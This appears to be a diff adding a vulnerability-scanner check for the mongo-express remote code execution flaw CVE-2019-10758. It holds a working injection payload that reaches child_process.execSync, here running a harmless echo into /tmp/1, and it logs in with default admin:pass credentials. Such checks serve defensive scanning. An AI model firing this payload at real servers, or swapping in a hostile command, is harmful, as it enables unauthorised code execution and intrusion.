@@ -1,0 +1,14 @@
+#request url = var
+#define payload = /checkValid
+#define bug =Valid
+#define info = 存在mongo-express 远程代码执行漏洞（CVE-2019-10758）
+#define post = document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("echo 'I am xiaokeai' >/tmp/1")
+
+function main(args)
+{
+	res = HttpPost(url.payload,post,"Authorization: Basic YWRtaW46cGFzcw==".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
